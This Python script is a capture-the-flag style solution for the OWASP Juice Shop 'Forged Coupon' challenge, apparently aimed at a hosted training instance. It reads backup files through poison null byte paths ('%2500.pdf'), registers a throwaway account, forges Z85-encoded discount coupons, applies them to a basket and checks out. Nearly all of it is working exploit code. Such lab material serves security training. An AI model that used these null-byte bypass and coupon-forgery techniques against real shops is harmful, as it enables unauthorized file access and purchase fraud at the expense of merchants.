#!/usr/bin/env python3
"""
COMPLETE FORGED COUPON SOLUTION
==============================
Based on YouTube solution: https://www.youtube.com/watch?v=stPCbG0umy0

Prerequisites:
1. Forgotten Sales Backup (access /ftp/coupons_2013.md.bak)
2. Forgotten Developer Backup (access /ftp/package.json.bak) 
3. Poison Null Byte (use %2500.pdf to access .bak files)

Solution: Generate Z85 encoded coupon with current date and 85%+ discount
"""

import requests
import time
import struct

# Z85 encoder
Z85_ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"

def z85_encode(data):
    if len(data) % 4 != 0:
        raise ValueError("Data length must be multiple of 4 bytes")
    
    encoded = ""
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        value = struct.unpack('>I', chunk)[0]
        
        for j in range(5):
            encoded = Z85_ALPHABET[value % 85] + encoded
            value //= 85
    
    return encoded

def solve_forged_coupon(base_url="https://juice5.wonkatech.org"):
    print(f"🎯 COMPLETE FORGED COUPON SOLUTION")
    print(f"Based on: https://www.youtube.com/watch?v=stPCbG0umy0")
    print(f"Target: {base_url}")
    
    session = requests.Session()
    
    # Step 1: Verify prerequisites are accessible
    print("\n📋 Step 1: Checking prerequisites...")
    
    backup_files = [
        ("/ftp/coupons_2013.md.bak%2500.pdf", "Sales Backup"),
        ("/ftp/package.json.bak%2500.md", "Developer Backup")
    ]
    
    for path, name in backup_files:
        response = session.get(f"{base_url}{path}")
        if response.status_code == 200:
            print(f"   ✅ {name}: Accessible")
        else:
            print(f"   ❌ {name}: Not accessible (HTTP {response.status_code})")
    
    # Step 2: Authentication
    print("\n🔑 Step 2: Authentication...")
    email = f"solution{int(time.time())}@test.com"
    password = "Solution123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code != 200:
        print(f"   ❌ Login failed")
        return False
    
    token = login.json()['authentication']['token']
    session.headers['Authorization'] = f'Bearer {token}'
    print(f"   ✅ Authenticated successfully")
    
    # Step 3: Setup basket
    print("\n🛒 Step 3: Setting up basket...")
    
    # Get expensive product for maximum discount impact
    products = session.get(f"{base_url}/rest/products/search").json()['data']
    expensive_product = max(products, key=lambda p: p['price'])
    
    # Add to basket
    add_response = session.post(f"{base_url}/api/BasketItems/", json={
        "ProductId": expensive_product['id'],
        "quantity": 1
    })
    
    print(f"   Added: {expensive_product['name']} (${expensive_product['price']})")
    
    # Get basket ID
    user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
    basket_id = user_data.get('bid', 1)
    print(f"   Basket ID: {basket_id}")
    
    # Step 4: Generate forged coupon
    print("\n🔧 Step 4: Generating forged coupon...")
    
    # Current date with 85% discount (more than 80% required)
    coupon_plaintext = "OCT25-85"  # October 2025, 85% discount
    coupon_encoded = z85_encode(coupon_plaintext.encode('utf-8'))
    
    print(f"   Plaintext: {coupon_plaintext}")
    print(f"   Z85 encoded: {coupon_encoded}")
    
    # Step 5: Apply forged coupon
    print("\n💰 Step 5: Applying forged coupon...")
    
    coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon_encoded}", json={})
    
    print(f"   Status: {coupon_response.status_code}")
    
    if coupon_response.status_code == 200:
        result = coupon_response.json()
        discount = result.get('discount', 0)
        
        print(f"   💰 Discount received: {discount}%")
        
        if discount >= 80:
            print(f"   🎉 CHALLENGE SOLVED! {discount}% discount achieved!")
            
            # Step 6: Complete checkout (optional)
            print("\n🛍️  Step 6: Completing checkout...")
            checkout_response = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
            print(f"   Checkout: {checkout_response.status_code}")
            
            return True
        else:
            print(f"   ⚠️  Insufficient discount: {discount}% (need 80%+)")
    else:
        print(f"   ❌ Failed: {coupon_response.text}")
        
        # Try alternative current month coupons
        print("\n🔄 Trying alternative coupons...")
        
        alternatives = [
            ("NOV25-90", "November 2025, 90%"),
            ("DEC25-85", "December 2025, 85%"),
            ("OCT25-99", "October 2025, 99%"),
        ]
        
        for alt_plaintext, desc in alternatives:
            alt_encoded = z85_encode(alt_plaintext.encode('utf-8'))
            print(f"   Testing: {alt_plaintext} ({desc}) → {alt_encoded}")
            
            alt_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{alt_encoded}", json={})
            
            if alt_response.status_code == 200:
                alt_result = alt_response.json()
                alt_discount = alt_result.get('discount', 0)
                
                if alt_discount >= 80:
                    print(f"   🎉 ALTERNATIVE SUCCESS! {alt_discount}% discount!")
                    return True
    
    return False

# Test the solution
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "https://juice5.wonkatech.org"  # Change this for your instance
    
    success = solve_forged_coupon(target_url)
    
    if success:
        print(f"\n🏆 FORGED COUPON CHALLENGE COMPLETED!")
    else:
        print(f"\n❌ Challenge not solved - may need working Juice Shop instance")
        print(f"📺 Reference: https://www.youtube.com/watch?v=stPCbG0umy0")

